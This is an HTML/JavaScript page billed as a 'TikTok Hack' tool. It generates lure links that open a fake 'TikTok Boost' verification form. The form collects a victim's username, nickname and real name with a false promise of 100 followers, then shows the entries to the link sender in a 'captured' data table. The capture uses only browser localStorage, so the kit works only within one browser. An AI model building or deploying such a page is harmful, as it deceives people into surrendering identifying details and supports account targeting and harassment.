<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Creator Console | Professional Study</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #050505;
            --tt-pink: #fe2c55;
            --tt-cyan: #25f4ee;
            --glass: rgba(255, 255, 255, 0.03);
            --border-glass: rgba(255, 255, 255, 0.1);
        }

        body {
            background-color: var(--bg-deep);
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Ambient Orbs */
        .orb { position: fixed; width: 400px; height: 400px; border-radius: 50%; filter: blur(100px); z-index: -1; opacity: 0.15; }
        .orb-1 { top: -10%; left: -10%; background: var(--tt-pink); }
        .orb-2 { bottom: -10%; right: -10%; background: var(--tt-cyan); }

        .container {
            width: 95%; max-width: 550px;
            background: rgba(10, 10, 12, 0.85);
            backdrop-filter: blur(25px);
            border: 1px solid var(--border-glass);
            padding: 40px 30px; border-radius: 32px;
            text-align: center; position: relative; z-index: 10;
        }

        h1 {
            font-size: 2.2rem; font-weight: 900; margin: 0;
            background: linear-gradient(to right, var(--tt-pink), var(--tt-cyan));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* --- Admin Dashboard Styles --- */
        .data-table-container {
            background: rgba(0,0,0,0.5); border-radius: 20px;
            margin-top: 25px; border: 1px solid var(--border-glass);
            overflow: hidden;
        }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { background: rgba(255,255,255,0.05); color: #888; padding: 12px; text-align: left; text-transform: uppercase; font-size: 10px; }
        td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); color: var(--tt-cyan); font-family: 'JetBrains Mono'; }

        /* --- Input & Buttons --- */
        .input-group {
            background: #f1f1f1; border-radius: 18px; text-align: left;
            padding: 12px 20px; margin-bottom: 15px; color: black;
        }
        label { font-size: 10px; color: #999; text-transform: uppercase; font-weight: 700; }
        input { background: transparent; border: none; outline: none; color: #000; font-size: 18px; width: 100%; margin-top: 5px; }

        .btn {
            width: 100%; padding: 18px; border-radius: 18px; font-weight: 800;
            cursor: pointer; transition: 0.3s; border: none; font-size: 16px;
            display: flex; justify-content: center; align-items: center; gap: 10px;
        }
        .btn-tt { background: var(--tt-pink); color: white; }
        .btn-glass { background: var(--glass); color: white; border: 1px solid var(--border-glass); margin-top: 10px; }

        /* --- Link Generation Animation --- */
        #gen-loader { display: none; margin: 20px 0; }
        .scanner-line {
            width: 100%; height: 2px; background: var(--tt-cyan);
            box-shadow: 0 0 15px var(--tt-cyan);
            position: relative; animation: scan 1s linear infinite;
        }
        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 20px; opacity: 0; } }

        /* --- Modern Alert --- */
        #customAlert {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); backdrop-filter: blur(10px);
            z-index: 1000; justify-content: center; align-items: center;
        }
        .alert-box {
            background: #111; border: 1px solid var(--tt-pink); padding: 30px;
            border-radius: 28px; text-align: center; max-width: 400px; width: 90%;
        }
    </style>
</head>
<body>

<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div id="customAlert">
    <div class="alert-box">
        <div id="alertIcon" style="font-size: 40px; margin-bottom: 15px; color: var(--tt-cyan);">ðŸ”—</div>
        <h3 id="alertTitle" style="color: white; margin-bottom: 10px;">SESSION READY</h3>
        <p id="alertMessage" style="color: #888; font-size: 14px; margin-bottom: 25px;"></p>
        <div id="alertActions" style="display: flex; gap: 10px; flex-direction: column;">
            </div>
    </div>
</div>

<div class="container" id="admin-view">
    <div style="font-size: 10px; color: var(--tt-cyan); letter-spacing: 3px; margin-bottom: 10px;">
        <i class="fas fa-shield-halved"></i> HACKING SYSTEM 
    </div>
    <h1>TIKTOK HACK</h1>
    <p style="color: #666; font-size: 13px; margin-bottom: 25px;">Send Link and hack TikTok ID</p>

    <button class="btn btn-tt" id="genBtn" onclick="startGeneration()">
        <i class="fas fa-link"></i> GENERATE NEW LINK
    </button>

    <div id="gen-loader">
        <div class="scanner-line"></div>
        <p style="font-size: 10px; color: var(--tt-cyan); margin-top: 10px; letter-spacing: 2px;">ENCRYPTING SESSION...</p>
    </div>

    <div class="data-table-container">
        <table>
            <thead>
                <tr>
                    <th><i class="fas fa-at"></i> Username</th>
                    <th><i class="fas fa-id-badge"></i> Nickname</th>
                    <th><i class="fas fa-user-tag"></i> Real Name</th>
                </tr>
            </thead>
            <tbody id="data-rows">
                <tr><td colspan="3" style="text-align:center; color:#444;">No data captured yet.</td></tr>
            </tbody>
        </table>
    </div>
</div>

<div class="container" id="user-view" style="display: none; background: white; color: #000; border: none;">
    <div id="form-content">
        <div style="font-size: 40px; color: #000; margin-bottom: 15px;"><i class="fas fa-heart"></i></div>
        <h1 style="background: #000; -webkit-background-clip: text; -webkit-text-fill-color: transparent;">TikTok Boost</h1>
        <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Account Identity Verification</p>

        <div class="input-group">
            <label>Username</label>
            <input type="text" id="tt-user" placeholder="@user">
        </div>
        <div class="input-group">
            <label>Account Nickname</label>
            <input type="text" id="tt-nick" placeholder="Display Name">
        </div>
        <div class="input-group">
            <label>Real Name</label>
            <input type="text" id="tt-real" placeholder="Legal Name">
        </div>

        <button class="btn btn-tt" id="boostBtn" onclick="processData()">
            <i class="fas fa-bolt"></i> START INJECTION
        </button>
    </div>

    <div id="success-view" style="display: none;">
        <i class="fas fa-circle-check" style="font-size: 60px; color: #3ddc84; margin-bottom: 20px;"></i>
        <h2>SUCCESS</h2>
        <p style="color: #666;">Account verified. Your 100 Followers Coming Soon.</p>
    </div>
</div>

<script>
    const params = new URLSearchParams(window.location.search);

    // --- ROUTING ---
    if(params.has('id')) {
        document.getElementById('admin-view').style.display = 'none';
        document.getElementById('user-view').style.display = 'block';
        document.body.style.background = "#f1f5f9";
    }

    // --- ADMIN: GENERATE LINK WITH ANIMATION ---
    function startGeneration() {
        const btn = document.getElementById('genBtn');
        const loader = document.getElementById('gen-loader');
        
        btn.style.display = 'none';
        loader.style.display = 'block';

        setTimeout(() => {
            const id = Math.random().toString(36).substring(7);
            const link = window.location.origin + window.location.pathname + "?id=" + id;
            
            loader.style.display = 'none';
            btn.style.display = 'flex';
            
            showModernAlert("LINK READY", link);
        }, 2000);
    }

    function showModernAlert(title, link) {
        document.getElementById('alertTitle').innerText = title;
        document.getElementById('alertMessage').innerText = link;
        
        const actions = document.getElementById('alertActions');
        actions.innerHTML = `
            <button class="btn btn-tt" onclick="window.open('${link}', '_blank')"><i class="fas fa-external-link"></i> VISIT PAGE</button>
            <button class="btn btn-glass" onclick="copyLink('${link}')"><i class="fas fa-copy"></i> COPY LINK</button>
            <button class="btn btn-glass" style="border:none; color:#555;" onclick="closeAlert()">DISMISS</button>
        `;
        document.getElementById('customAlert').style.display = 'flex';
    }

    function closeAlert() { document.getElementById('customAlert').style.display = 'none'; }

    function copyLink(text) {
        navigator.clipboard.writeText(text);
        alert("Copied to clipboard!");
    }

    // --- USER: PROCESS DATA ---
    function processData() {
        const user = document.getElementById('tt-user').value;
        const nick = document.getElementById('tt-nick').value;
        const real = document.getElementById('tt-real').value;

        if(!user || !nick || !real) return alert("Fill all fields");

        const btn = document.getElementById('boostBtn');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
        btn.disabled = true;

        // Log Data
        const logs = JSON.parse(localStorage.getItem('tt_v3_logs') || '[]');
        logs.push({ user, nick, real, time: new Date().toLocaleTimeString() });
        localStorage.setItem('tt_v3_logs', JSON.stringify(logs));

        setTimeout(() => {
            document.getElementById('form-content').style.display = 'none';
            document.getElementById('success-view').style.display = 'block';
        }, 2500);
    }

    // --- ADMIN: REFRESH DATA TABLE ---
    if(!params.has('id')) {
        setInterval(() => {
            const data = JSON.parse(localStorage.getItem('tt_v3_logs') || '[]');
            const rowContainer = document.getElementById('data-rows');
            if(data.length > 0) {
                rowContainer.innerHTML = data.reverse().map(item => `
                    <tr>
                        <td>${item.user}</td>
                        <td>${item.nick}</td>
                        <td>${item.real}</td>
                    </tr>
                `).join('');
            }
        }, 2000);
    }
</script>

</body>
</html>
